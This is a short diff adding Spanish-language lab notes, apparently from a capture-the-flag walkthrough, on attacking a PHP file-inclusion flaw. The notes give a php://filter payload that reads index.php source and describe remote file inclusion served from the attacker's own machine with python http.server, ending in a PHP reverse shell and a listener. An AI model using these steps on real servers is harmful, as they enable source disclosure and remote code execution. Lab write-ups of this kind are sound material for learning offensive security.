@@ -1,0 +1,11 @@
+php://filter/convert.base64-encode/resource=index
+nos permite leer el fichero index.php
+
+Como están permitidos en la configuración los allow_url_include podemos referenciar documentos externos!
+si ponemos http://172.17.0.3/loquesea en el formulario cargaremos el fichero loquesea.php que tengamos en el servidor web de nuestra máquina de ataque
+Podemos utilizar
+python -m http.server 80 &
+para levantar un miniservidor web basado en python en el puerto 80 y dejarlo en background, utilizará los ficheros de la carpeta en la que estábamos al lanzar el comando
+
+Escribimos una shell reversa en php, ponemos el listener y al cargarlo desde la web, nos debería devolver una shell.
+
